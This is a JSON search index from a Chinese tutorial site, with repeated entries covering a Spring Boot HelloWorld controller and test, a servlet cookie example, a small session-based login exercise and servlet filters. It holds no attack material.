\u9875\u9762\u8fdb\u884c\u521b\u5efa\uff0c\u6216\u8005\u76f4\u63a5\u4f7f\u7528idea\u521b\u5efa\u3002\u8fd9\u91cc\u76f4\u63a5\u4f7f\u7528idea\u3002 \u9996\u5148\u70b9\u51fb\u65b0\u5efa\u9879\u76ee: \u6309\u7167\u5982\u56fe\u6240\u793a\u914d\u7f6e\uff0c\u8fd9\u91cc\u9009\u7528java8\uff0cMaven\u8fdb\u884c\u4f9d\u8d56\u7ba1\u7406\u3002 \u9009\u62e9\u9700\u8981\u7684\u4f9d\u8d56\uff0c\u8fd9\u91cc\u9009\u62e9Spring Web\uff0cSpringBoot\u7248\u672c\u9009\u62e9\u9ed8\u8ba4\u76842.6.3 \u70b9\u51fbFINISH\uff0c\u5373\u53ef\u521b\u5efa\u9879\u76ee\uff0c\u9700\u8981\u7b49\u5f85\u4e00\u6bb5\u65f6\u95f4idea\u89e3\u6790maven\u4f9d\u8d56\u3002 \u521b\u5efa\u597d\u540e\u7684\u9879\u76ee\u7ed3\u6784\u5982\u56fe\u6240\u793a(controller\u6587\u4ef6\u5939\u662f\u6211\u540e\u7eed\u6dfb\u52a0\u7684\uff0c\u4e00\u5f00\u59cb\u662f\u6ca1\u6709\u7684) \u5982\u4e0a\u56fe\u6240\u793a\uff0cSpring Boot\u7684\u57fa\u7840\u7ed3\u6784\u5171\u4e09\u4e2a\u6587\u4ef6\u5939(\u5177\u4f53\u8def\u5f84\u6839\u636e\u7528\u6237\u751f\u6210\u9879\u76ee\u65f6\u586b\u5199\u7684Group\u548cArtiFact\u6709\u6240\u5dee\u5f02\uff09: - src/main/java \u4e0b\u7684\u7a0b\u5e8f\u5165\u53e3\uff1a SpringBootStudyApplication - src/main/resources \u4e0b\u7684\u914d\u7f6e\u6587\u4ef6\uff1a application.properties - src/test/ \u4e0b\u7684\u6d4b\u8bd5\u5165\u53e3\uff1a SpringBootStudyApplicationTests","title":"\u521d\u59cb\u5316\u5de5\u7a0b"},{"location":"%E5%AE%89%E5%85%A8/java/springboot-2.x/HelloWorld/#\u7f16\u5199helloworldcontroller","text":"\u5728 src/main/java \u6587\u4ef6\u5939\u4e0b\u521b\u5efa com.example.springbootstudy.controller \u5305\uff0c\u5728\u8be5\u5305\u4e0b\u521b\u5efa HelloWorldController (\u6ce8\u610f\uff0c\u8fd9\u91cc\u6211\u4eec\u7684Controller\u5fc5\u987b\u5728\u6211\u4eec\u7684 SpringbootStudyApplication \u6587\u4ef6\u5939\u53ca\u5b50\u6587\u4ef6\u5939\u4e0b\uff0c\u5426\u5219\u65e0\u6cd5\u52a0\u8f7d\uff0cController\u7c7b\u9996\u5b57\u6bcd\u5fc5\u987b\u5927\u5199): package com.example.springbootstudy.controller ; import org.springframework.web.bind.annotation.RequestMapping ; import org.springframework.web.bind.annotation.RestController ; @RestController public class HelloController { @RequestMapping ( \"/hello\" ) public String index () { return \"Hello World\" ; } } \u8fd9\u91cc\u89e3\u91ca\u4e00\u4e0b\u5176\u4e2d\u76842\u4e2a\u6ce8\u89e3\u7684\u4f5c\u7528: - @RestController : \u5176\u7b49\u4ef7\u4e8e @ResponseBody + @Controller \uff0c\u5206\u522b\u4ecb\u7ecd\u4e0b\u8fd92\u4e2a\u6ce8\u89e3: - @ResponseBody : \u8bbe\u7f6e\u4e86\u8fd9\u4e2a\u6ce8\u89e3\u7684\u7c7b/\u65b9\u6cd5\u8fd4\u56de\u7684\u503c\u5c31\u662freturn\u4e2d\u7684\u5185\u5bb9\uff0c\u65e0\u6cd5\u8fd4\u56de\u6307\u5b9a\u7684View\u9875\u9762(\u5982 index.html \u7b49)\uff0c\u4f46\u662f\u5176\u80fd\u591f\u8fd4\u56dejson\uff0cxml\u6216\u81ea\u5b9a\u4e49mediaType\u5185\u5bb9\u5230\u9875\u9762(\u5373\u5c06\u4e00\u4e2aObject\u81ea\u52a8\u5e8f\u5217\u5316\u6210json\u540e\u8fd4\u56de) - @Controller : \u8868\u793aSpring\u67d0\u4e2a\u7c7b\u662f\u5426\u53ef\u4ee5\u63a5\u6536HTTP\u8bf7\u6c42\uff0c\u80fd\u591f\u8fd4\u56de\u6307\u5b9a\u7684View\u9875\u9762(\u5982 return index \u5219\u4f1a\u8df3\u8f6c\u5230\u89c6\u56fe\u5c42 index.html ) - @RequestMapping : \u8bbe\u7f6e\u8bf7\u6c42\u6620\u5c04(\u5373\u8def\u7531)","title":"\u7f16\u5199HelloWorldController"},{"location":"%E5%AE%89%E5%85%A8/java/springboot-2.x/HelloWorld/#\u914d\u7f6e","text":"springboot\u4e2d\u53ef\u4ee5\u4f7f\u7528application.properties\u6216\u8005application.yml\u5bf9\u9879\u76ee\u8fdb\u884c\u914d\u7f6e\uff0c\u540e\u8005\u7684\u4f18\u5148\u7ea7\u8f83\u9ad8\u3002\u4e24\u8005\u7684\u533a\u522b\u662f\u524d\u8005\u6bd4\u8f83\u76f4\u63a5\uff0c\u4f46\u6ca1\u6709\u5c42\u6b21\u611f\uff0c\u540e\u8005\u76f8\u53cd\u3002 \u5728springboot 2.1\u4e4b\u540e\uff0cspringboot\u542f\u52a8\u9ed8\u8ba4\u4e0d\u4f1a\u663e\u793amapping\u65e5\u5fd7\uff0c\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7\u4fee\u6539\u914d\u7f6e\u6765\u8ba9\u5176\u8f93\u51famapping\u65e5\u5fd7\uff0c\u4ee5\u4e86\u89e3\u54ea\u4e9bcontroller\u88ab\u6210\u529f\u52a0\u8f7d\uff0c\u6211\u4eec\u4ee5application.properties\u4e3a\u4f8b: server.port=8080 logging.level.org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping=trace \u7b2c\u4e00\u884c\u8bbe\u7f6e\u7684\u662f\u670d\u52a1\u7684\u76d1\u542c\u7aef\u53e3\uff0c\u7b2c\u4e8c\u884c\u5c31\u662f\u8bbe\u7f6emapping\u65e5\u5fd7\u7ea7\u522b\uff0c\u4ee5\u663e\u793a\u6211\u4eec\u7684mapping\u65e5\u5fd7\u3002","title":"\u914d\u7f6e"},{"location":"%E5%AE%89%E5%85%A8/java/springboot-2.x/HelloWorld/#\u8fd0\u884c","text":"\u8fd0\u884cSpringbootStudyApplication.main()\u65b9\u6cd5\uff0c\u542f\u52a8springboot\uff0c\u6709\u4ee5\u4e0b\u4fe1\u606f\u5c31\u8bc1\u660econtroller\u88ab\u6210\u529f\u52a0\u8f7d\u4e86: \u5c1d\u8bd5\u8bbf\u95eehttp://127.0.0.1:8080/hello:","title":"\u8fd0\u884c"},{"location":"%E5%AE%89%E5%85%A8/java/springboot-2.x/HelloWorld/#\u7f16\u5199\u6d4b\u8bd5","text":"\u9700\u8981\u7ed9pom.xml\u6dfb\u52a0junit\u4f9d\u8d56: <dependency> <groupId> junit </groupId> <artifactId> junit </artifactId> <scope> test </scope> </dependency> \u5b8c\u6574\u7684\u6d4b\u8bd5\u5982\u4e0b\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\u6700\u540e\u7684\u4e09\u4e2aimport\uff0c\u9700\u8981static\u624d\u80fdimport\uff0c\u8fd9\u91cc\u6211\u4eec\u7f16\u5199\u6d4b\u8bd5\uff0c\u6d4b\u8bd5\u4e00\u4e0b/hello\u662f\u5426\u8fd4\u56de200 ok\u53ca\u54cd\u5e94\u662f\u5426\u4e3aHello World: package com.example.springbootstudy ; import com.example.springbootstudy.controller.HelloController ; import org.junit.jupiter.api.Test ; import org.junit.runner.RunWith ; import org.springframework.boot.test.context.SpringBootTest ; import org.springframework.http.MediaType ; import org.springframework.test.context.junit4.SpringRunner ; import org.springframework.test.web.servlet.MockMvc ; import org.springframework.test.web.servlet.request.MockMvcRequestBuilders ; import org.springframework.test.web.servlet.setup.MockMvcBuilders ; import static org.hamcrest.Matchers.equalTo ; import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content ; import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status ; @RunWith ( SpringRunner . class ) @SpringBootTest class SpringbootStudyApplicationTests { private MockMvc mvc ; @Test public void getHello () throws Exception { mvc = MockMvcBuilders . standaloneSetup ( new HelloController ()). build (); mvc . perform ( MockMvcRequestBuilders . get ( \"/hello\" ). accept ( MediaType . APPLICATION_JSON )) . andExpect ( status (). isOk ()) . andExpect ( content (). string ( equalTo ( \"Hello World\" ))); } }","title":"\u7f16\u5199\u6d4b\u8bd5"},{"location":"%E5%AE%89%E5%85%A8/java/web/Cookie/","tags":["java"],"text":"Cookie # Cookie \u662f\u6d4f\u89c8\u5668\u8bbf\u95ee\u670d\u52a1\u5668\u540e\uff0c\u670d\u52a1\u5668\u4f20\u7ed9\u6d4f\u89c8\u5668\u7684\u4e00\u6bb5\u6570\u636e\u3002 \u6d4f\u89c8\u5668\u4f1a\u4fdd\u5b58\u8fd9\u6bb5\u6570\u636e\uff0c\u4e0d\u8f7b\u6613\u5220\u9664\u3002 \u6b64\u540e\u6bcf\u6b21\u6d4f\u89c8\u5668\u8bbf\u95ee\u8be5\u670d\u52a1\u5668\uff0c\u90fd\u4f1a\u5e26\u4e0a\u8fd9\u6bb5\u6570\u636e\uff0c\u4ee5\u6b64\u6765\u8bfb\u53d6\u4e00\u4e9b\u5ba2\u6237\u4fe1\u606f\u3002 \u7b80\u5355\u793a\u4f8b # ```java package top.longlone.servlet; import javax.servlet.ServletException; import javax.servlet.ServletInputStream; import javax.servlet.http.Cookie; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.PrintWriter; import java.net.URLDecoder; import java.text.SimpleDateFormat; import java.util.Date; public class CookieServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { req.setCharacterEncoding(\"UTF-8\"); resp.setHeader(\"Content-Type\", \"text/html; charset=UTF-8\"); PrintWriter out = resp.getWriter(); Cookie[] cookies = req.getCookies(); Boolean flag = false; // \u904d\u5386\u5bfb\u627ecookie if (cookies.length > 0) { for (Cookie cookie:cookies) { // \u53d6cookie\u7684\u503c if (cookie.getName().equals(\"time\")) { SimpleDateFormat sdf = new SimpleDateFormat(); sdf.applyPattern(\"yyyy-MM-dd HH:mm:ss\"); Long time = Long.parseLong(cookie.getValue()); out.write(\"\u4f60\u4e0a\u4e00\u6b21\u8bbf\u95ee\u670d\u52a1\u5668\u7684\u65f6\u95f4\u662f: \" + sdf.format(time)); flag = true; break; } } if (!flag) { out.write(\"\u7b2c\u4e00\u6b21\u8bbf\u95ee\u670d\u52a1\u5668\"); } } else { out.write(\"\u6ca1\u6709Cookie\u8bbf\u95ee\u670d\u52a1\u5668\"); } // \u8bbe\u7f6ecookie Date date = new Date(); Cookie cookie = new Cookie(\"time\", String.valueOf(date.getTime())); // \u8bbe\u7f6eMaxAge\u4e3a0\u7684\u8bdd\u5219\u4f1a\u7acb\u5373\u9500\u6bc1\u8be5\u540d\u5b57\u5bf9\u5e94\u7684cookie cookie.setMaxAge(24*60*60); resp.addCookie(cookie); } } ```` \u603b\u7ed3 # \u8fd9\u8282\u4e3b\u8981\u8bb2\u4e86\u4ec0\u4e48\u662fCookie\u4ee5\u53caCookie\u7684\u7b80\u5355\u793a\u4f8b\u3002","title":"Cookie"},{"location":"%E5%AE%89%E5%85%A8/java/web/Cookie/#cookie","text":"Cookie \u662f\u6d4f\u89c8\u5668\u8bbf\u95ee\u670d\u52a1\u5668\u540e\uff0c\u670d\u52a1\u5668\u4f20\u7ed9\u6d4f\u89c8\u5668\u7684\u4e00\u6bb5\u6570\u636e\u3002 \u6d4f\u89c8\u5668\u4f1a\u4fdd\u5b58\u8fd9\u6bb5\u6570\u636e\uff0c\u4e0d\u8f7b\u6613\u5220\u9664\u3002 \u6b64\u540e\u6bcf\u6b21\u6d4f\u89c8\u5668\u8bbf\u95ee\u8be5\u670d\u52a1\u5668\uff0c\u90fd\u4f1a\u5e26\u4e0a\u8fd9\u6bb5\u6570\u636e\uff0c\u4ee5\u6b64\u6765\u8bfb\u53d6\u4e00\u4e9b\u5ba2\u6237\u4fe1\u606f\u3002","title":"Cookie"},{"location":"%E5%AE%89%E5%85%A8/java/web/Cookie/#\u7b80\u5355\u793a\u4f8b","text":"```java package top.longlone.servlet; import javax.servlet.ServletException; import javax.servlet.ServletInputStream; import javax.servlet.http.Cookie; import javax.servlet.http.HttpServlet; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.PrintWriter; import java.net.URLDecoder; import java.text.SimpleDateFormat; import java.util.Date; public class CookieServlet extends HttpServlet { @Override protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException { req.setCharacterEncoding(\"UTF-8\"); resp.setHeader(\"Content-Type\", \"text/html; charset=UTF-8\"); PrintWriter out = resp.getWriter(); Cookie[] cookies = req.getCookies(); Boolean flag = false; // \u904d\u5386\u5bfb\u627ecookie if (cookies.length > 0) { for (Cookie cookie:cookies) { // \u53d6cookie\u7684\u503c if (cookie.getName().equals(\"time\")) { SimpleDateFormat sdf = new SimpleDateFormat(); sdf.applyPattern(\"yyyy-MM-dd HH:mm:ss\"); Long time = Long.parseLong(cookie.getValue()); out.write(\"\u4f60\u4e0a\u4e00\u6b21\u8bbf\u95ee\u670d\u52a1\u5668\u7684\u65f6\u95f4\u662f: \" + sdf.format(time)); flag = true; break; } } if (!flag) { out.write(\"\u7b2c\u4e00\u6b21\u8bbf\u95ee\u670d\u52a1\u5668\"); } } else { out.write(\"\u6ca1\u6709Cookie\u8bbf\u95ee\u670d\u52a1\u5668\"); } // \u8bbe\u7f6ecookie Date date = new Date(); Cookie cookie = new Cookie(\"time\", String.valueOf(date.getTime())); // \u8bbe\u7f6eMaxAge\u4e3a0\u7684\u8bdd\u5219\u4f1a\u7acb\u5373\u9500\u6bc1\u8be5\u540d\u5b57\u5bf9\u5e94\u7684cookie cookie.setMaxAge(24*60*60); resp.addCookie(cookie); } } ````","title":"\u7b80\u5355\u793a\u4f8b"},{"location":"%E5%AE%89%E5%85%A8/java/web/Cookie/#\u603b\u7ed3","text":"\u8fd9\u8282\u4e3b\u8981\u8bb2\u4e86\u4ec0\u4e48\u662fCookie\u4ee5\u53caCookie\u7684\u7b80\u5355\u793a\u4f8b\u3002","title":"\u603b\u7ed3"},{"location":"%E5%AE%89%E5%85%A8/java/web/Exercise/","tags":["java"],"text":"Exercise # \u6700\u540e\u7528\u524d\u9762\u5b66\u5230\u7684\u77e5\u8bc6\u505a\u4e00\u4e2a\u5c0f\u7ec3\u4e60\uff0c\u505a\u4e00\u4e2a\u767b\u5f55\u8ba4\u8bc1 \u6240\u7528\u5230\u7684\u77e5\u8bc6\u6709: - Servlet\uff0cHttpServletRequest\uff0cHttpServletResponse - Session - Filter config.properties username = admin password = 123456 Index\u9875\u9762\uff0c\u767b\u5f55\u540e\u7684\u9875\u9762 package top.longlone.servlet ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; public class IndexServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { resp . getWriter (). write ( \"\u6b22\u8fce\u4f60\uff0cadmin\" ); } } Login\u9875\u9762\uff0c\u8981\u6c42\u767b\u5f55\u7684\u9875\u9762 package top.longlone.servlet ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import javax.servlet.http.HttpSession ; import java.io.IOException ; import java.io.InputStream ; import java.util.Properties ; public class LoginServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { InputStream in = this . getServletContext (). getResourceAsStream ( \"/WEB-INF/classes/config.properties\" ); Properties prop = new Properties (); prop . load ( in ); String username = req . getParameter ( \"username\" ); String password = req . getParameter ( \"password\" ); String adminUsername = prop . getProperty ( \"username\" ); String adminPassword = prop . getProperty ( \"password\" ); if ( username == null || password == null ) { resp . getWriter (). write ( \"Please submit username and password parameter\" ); return ; } if ( username . equals ( adminUsername ) && password . equals ( adminPassword )) { HttpSession session = req . getSession (); session . setAttribute ( \"username\" , \"admin\" ); resp . sendRedirect ( \"/index\" ); } else { resp . getWriter (). write ( \"Login error\" ); } } } \u8ba4\u8bc1\u8fc7\u6ee4\u5668 package top.longlone.filter ; import javax.servlet.* ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import javax.servlet.http.HttpSession ; import java.io.IOException ; public class AuthFilter implements Filter { public void init ( FilterConfig filterConfig ) throws ServletException { } public void doFilter ( ServletRequest request , ServletResponse response , FilterChain chain ) throws IOException , ServletException { HttpServletRequest servletRequest = ( HttpServletRequest ) request ; HttpServletResponse servletResponse = ( HttpServletResponse ) response ; HttpSession session = servletRequest . getSession (); String username = ( String ) session . getAttribute ( \"username\" ); if ( username == null || username . equals ( \"\" )) { servletResponse . sendRedirect ( \"/login\" ); return ; } chain . doFilter ( request , response ); } public void destroy () { } } \u8bbe\u7f6e\u54cd\u5e94\u5934\u8fc7\u6ee4\u5668 package top.longlone.filter ; import javax.servlet.* ; import java.io.IOException ; public class CharacterEncodingFilter implements Filter { public void init ( FilterConfig filterConfig ) throws ServletException { } public void doFilter ( ServletRequest request , ServletResponse response , FilterChain chain ) throws IOException , ServletException { request . setCharacterEncoding ( \"utf-8\" ); response . setContentType ( \"text/html; charset=utf-8\" ); chain . doFilter ( request , response ); } public void destroy () { } } web.xml <?xml version=\"1.0\" encoding=\"UTF-8\"?> <web-app xmlns= \"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version= \"4.0\" > <servlet> <servlet-name> index </servlet-name> <servlet-class> top.longlone.servlet.IndexServlet </servlet-class> </servlet> <servlet> <servlet-name> login </servlet-name> <servlet-class> top.longlone.servlet.LoginServlet </servlet-class> </servlet> <servlet-mapping> <servlet-name> index </servlet-name> <url-pattern> /index </url-pattern> </servlet-mapping> <servlet-mapping> <servlet-name> login </servlet-name> <url-pattern> /login </url-pattern> </servlet-mapping> <filter> <filter-name> characterEncoding </filter-name> <filter-class> top.longlone.filter.CharacterEncodingFilter </filter-class> </filter> <filter> <filter-name> auth </filter-name> <filter-class> top.longlone.filter.AuthFilter </filter-class> </filter> <filter-mapping> <filter-name> characterEncoding </filter-name> <url-pattern> /* </url-pattern> </filter-mapping> <filter-mapping> <filter-name> auth </filter-name> <url-pattern> /index </url-pattern> </filter-mapping> </web-app>","title":"Exercise"},{"location":"%E5%AE%89%E5%85%A8/java/web/Exercise/#exercise","text":"\u6700\u540e\u7528\u524d\u9762\u5b66\u5230\u7684\u77e5\u8bc6\u505a\u4e00\u4e2a\u5c0f\u7ec3\u4e60\uff0c\u505a\u4e00\u4e2a\u767b\u5f55\u8ba4\u8bc1 \u6240\u7528\u5230\u7684\u77e5\u8bc6\u6709: - Servlet\uff0cHttpServletRequest\uff0cHttpServletResponse - Session - Filter config.properties username = admin password = 123456 Index\u9875\u9762\uff0c\u767b\u5f55\u540e\u7684\u9875\u9762 package top.longlone.servlet ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; public class IndexServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { resp . getWriter (). write ( \"\u6b22\u8fce\u4f60\uff0cadmin\" ); } } Login\u9875\u9762\uff0c\u8981\u6c42\u767b\u5f55\u7684\u9875\u9762 package top.longlone.servlet ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import javax.servlet.http.HttpSession ; import java.io.IOException ; import java.io.InputStream ; import java.util.Properties ; public class LoginServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { InputStream in = this . getServletContext (). getResourceAsStream ( \"/WEB-INF/classes/config.properties\" ); Properties prop = new Properties (); prop . load ( in ); String username = req . getParameter ( \"username\" ); String password = req . getParameter ( \"password\" ); String adminUsername = prop . getProperty ( \"username\" ); String adminPassword = prop . getProperty ( \"password\" ); if ( username == null || password == null ) { resp . getWriter (). write ( \"Please submit username and password parameter\" ); return ; } if ( username . equals ( adminUsername ) && password . equals ( adminPassword )) { HttpSession session = req . getSession (); session . setAttribute ( \"username\" , \"admin\" ); resp . sendRedirect ( \"/index\" ); } else { resp . getWriter (). write ( \"Login error\" ); } } } \u8ba4\u8bc1\u8fc7\u6ee4\u5668 package top.longlone.filter ; import javax.servlet.* ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import javax.servlet.http.HttpSession ; import java.io.IOException ; public class AuthFilter implements Filter { public void init ( FilterConfig filterConfig ) throws ServletException { } public void doFilter ( ServletRequest request , ServletResponse response , FilterChain chain ) throws IOException , ServletException { HttpServletRequest servletRequest = ( HttpServletRequest ) request ; HttpServletResponse servletResponse = ( HttpServletResponse ) response ; HttpSession session = servletRequest . getSession (); String username = ( String ) session . getAttribute ( \"username\" ); if ( username == null || username . equals ( \"\" )) { servletResponse . sendRedirect ( \"/login\" ); return ; } chain . doFilter ( request , response ); } public void destroy () { } } \u8bbe\u7f6e\u54cd\u5e94\u5934\u8fc7\u6ee4\u5668 package top.longlone.filter ; import javax.servlet.* ; import java.io.IOException ; public class CharacterEncodingFilter implements Filter { public void init ( FilterConfig filterConfig ) throws ServletException { } public void doFilter ( ServletRequest request , ServletResponse response , FilterChain chain ) throws IOException , ServletException { request . setCharacterEncoding ( \"utf-8\" ); response . setContentType ( \"text/html; charset=utf-8\" ); chain . doFilter ( request , response ); } public void destroy () { } } web.xml <?xml version=\"1.0\" encoding=\"UTF-8\"?> <web-app xmlns= \"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version= \"4.0\" > <servlet> <servlet-name> index </servlet-name> <servlet-class> top.longlone.servlet.IndexServlet </servlet-class> </servlet> <servlet> <servlet-name> login </servlet-name> <servlet-class> top.longlone.servlet.LoginServlet </servlet-class> </servlet> <servlet-mapping> <servlet-name> index </servlet-name> <url-pattern> /index </url-pattern> </servlet-mapping> <servlet-mapping> <servlet-name> login </servlet-name> <url-pattern> /login </url-pattern> </servlet-mapping> <filter> <filter-name> characterEncoding </filter-name> <filter-class> top.longlone.filter.CharacterEncodingFilter </filter-class> </filter> <filter> <filter-name> auth </filter-name> <filter-class> top.longlone.filter.AuthFilter </filter-class> </filter> <filter-mapping> <filter-name> characterEncoding </filter-name> <url-pattern> /* </url-pattern> </filter-mapping> <filter-mapping> <filter-name> auth </filter-name> <url-pattern> /index </url-pattern> </filter-mapping> </web-app>","title":"Exercise"},{"location":"%E5%AE%89%E5%85%A8/java/web/Filter/","tags":["java"],"text":"Filter # \u53ef\u4ee5\u7406\u89e3\u4e3a\u4e2d\u95f4\u4ef6\uff0c\u5f00\u53d1\u8005\u53ef\u4ee5\u5bf9web\u670d\u52a1\u5668\u7ba1\u7406\u7684\u6240\u6709web\u8d44\u6e90\uff1a\u4f8b\u5982JSP\uff0cServlet\uff0c\u9759\u6001\u56fe\u7247\u6587\u4ef6\u6216\u9759\u6001HTML\u6587\u4ef6\u8fdb\u884c\u62e6\u622a\uff0c\u4ece\u800c\u5b9e\u73b0\u4e00\u4e9b\u7279\u6b8a\u529f\u80fd\u3002 \u793a\u4f8b\u4ee3\u7801 # \u4e00\u4e2a\u7b80\u5355\u7684\u901a\u8fc7\u8bbe\u7f6e\u8bf7\u6c42\u5934\u6765\u89e3\u51b3\u4e2d\u6587\u663e\u793a\u4e71\u7801\u7684\u8fc7\u6ee4\u5668 \u5b9e\u73b0Filter\u63a5\u53e3\uff0c\u91cd\u5199 init \uff0c doFilter \uff0c destroy \u4e09\u4e2a\u65b9\u6cd5\uff0c\u8fd9\u91cc\u6ce8\u610f chain.doFilter \u65b9\u6cd5\uff0c\u5b83\u5c06\u8bf7\u6c42\u8f6c\u53d1\u7ed9\u8fc7\u6ee4\u5668\u94fe\u4e0b\u4e00\u4e2afilter , \u5982\u679c\u6ca1\u6709filter\u90a3\u5c31\u662f\u4f60\u8bf7\u6c42\u7684\u8d44\u6e90\uff0c\u5982\u679c\u6ca1\u6709\u8c03\u7528\u8be5\u65b9\u6cd5\uff0c\u8bf7\u6c42\u5c31\u4f1a\u5728\u8fd9\u4e2a\u8fc7\u6ee4\u5668\u4e2d\u7ed3\u675f package top.longlone.filter ; import javax.servlet.* ; import java.io.IOException ; public class CharacterEncodingFilter implements Filter { public void init ( FilterConfig filterConfig ) throws ServletException { } public void doFilter ( ServletRequest request , ServletResponse response , FilterChain chain ) throws IOException , ServletException { response . setContentType ( \"text/html; charset=utf-8\" ); chain . doFilter ( request , response ); } public void destroy () { } } \u4e00\u4e2a\u7528\u4e8e\u7b80\u5355\u6d4b\u8bd5\u7684Servlet package top.longlone.servlet ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; public class IndexServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { resp . getWriter (). write ( \"\u4e71\u7801\u6d4b\u8bd5\" ); } } \u4fee\u6539web.iml\uff0c\u540c\u6837\u9700\u8981\u5728\u6b64\u5bf9\u8fc7\u6ee4\u5668\u8fdb\u884c\u6ce8\u518c\u548c\u6620\u5c04\uff0c\u4f7f\u7528filter\u548cfilter-mapping\u4e24\u4e2a\u6807\u7b7e <?xml version=\"1.0\" encoding=\"UTF-8\"?> <web-app xmlns= \"http://xmlns.jcp.org/xml/ns/javaee\" xmlns:xsi= \"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation= \"http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd\" version= \"4.0\" > <servlet> <servlet-name> index </servlet-name> <servlet-class> top.longlone.servlet.IndexServlet </servlet-class> </servlet> <servlet-mapping> <servlet-name> index </servlet-name> <url-pattern> /index </url-pattern> </servlet-mapping> <filter> <filter-name> characterEncoding </filter-name> <filter-class> top.longlone.filter.CharacterEncodingFilter </filter-class> </filter> <filter-mapping> <filter-name> characterEncoding </filter-name> <url-pattern> /index </url-pattern> </filter-mapping> </web-app>","title":"Filter"},{"location":"%E5%AE%89%E5%85%A8/java/web/Filter/#filter","text":"\u53ef\u4ee5\u7406\u89e3\u4e3a\u4e2d\u95f4\u4ef6\uff0c\u5f00\u53d1\u8005\u53ef\u4ee5\u5bf9web\u670d\u52a1\u5668\u7ba1\u7406\u7684\u6240\u6709web\u8d44\u6e90\uff1a\u4f8b\u5982JSP\uff0cServlet\uff0c\u9759\u6001\u56fe\u7247\u6587\u4ef6\u6216\u9759\u6001HTML\u6587\u4ef6\u8fdb\u884c\u62e6\u622a\uff0c\u4ece\u800c\u5b9e\u73b0\u4e00\u4e9b\u7279\u6b8a\u529f\u80fd\u3002","title":"Filter"},{"location":"%E5%AE%89%E5%85%A8/java/web/Filter/#\u793a\u4f8b\u4ee3\u7801","text":"\u4e00\u4e2a\u7b80\u5355\u7684\u901a\u8fc7\u8bbe\u7f6e\u8bf7\u6c42\u5934\u6765\u89e3\u51b3\u4e2d\u6587\u663e\u793a\u4e71\u7801\u7684\u8fc7\u6ee4\u5668 \u5b9e\u73b0Filter\u63a5\u53e3\uff0c\u91cd\u5199 init \uff0c doFilter \uff0c destroy \u4e09\u4e2a\u65b9\u6cd5\uff0c\u8fd9\u91cc\u6ce8\u610f chain.doFilter \u65b9\u6cd5\uff0c\u5b83\u5c06\u8bf7\u6c42\u8f6c\u53d1\u7ed9\u8fc7\u6ee4\u5668\u94fe\u4e0b\u4e00\u4e2afilter , \u5982\u679c\u6ca1\u6709filter\u90a3\u5c31\u662f\u4f60\u8bf7\u6c42\u7684\u8d44\u6e90\uff0c\u5982\u679c\u6ca1\u6709\u8c03\u7528\u8be5\u65b9\u6cd5\uff0c\u8bf7\u6c42\u5c31\u4f1a\u5728\u8fd9\u4e2a\u8fc7\u6ee4\u5668\u4e2d\u7ed3\u675f package top.longlone.filter ; import javax.servlet.* ; import java.io.IOException ; public class CharacterEncodingFilter implements Filter { public void init ( FilterConfig filterConfig ) throws ServletException { } public void doFilter ( ServletRequest request , ServletResponse response , FilterChain chain ) throws IOException , ServletException { response . setContentType ( \"text/html; charset=utf-8\" ); chain . doFilter ( request , response ); } public void destroy () { } } \u4e00\u4e2a\u7528\u4e8e\u7b80\u5355\u6d4b\u8bd5\u7684Servlet package top.longlone.servlet ; import javax.servlet.ServletException ; import javax.servlet.http.HttpServlet ; import javax.servlet.http.HttpServletRequest ; import javax.servlet.http.HttpServletResponse ; import java.io.IOException ; public class IndexServlet extends HttpServlet { @Override protected void doGet ( HttpServletRequest req , HttpServletResponse resp ) throws ServletException , IOException { resp . getWriter (). write ( \"\u4e71\u7801\u6d4b\u8bd5\" ); } } 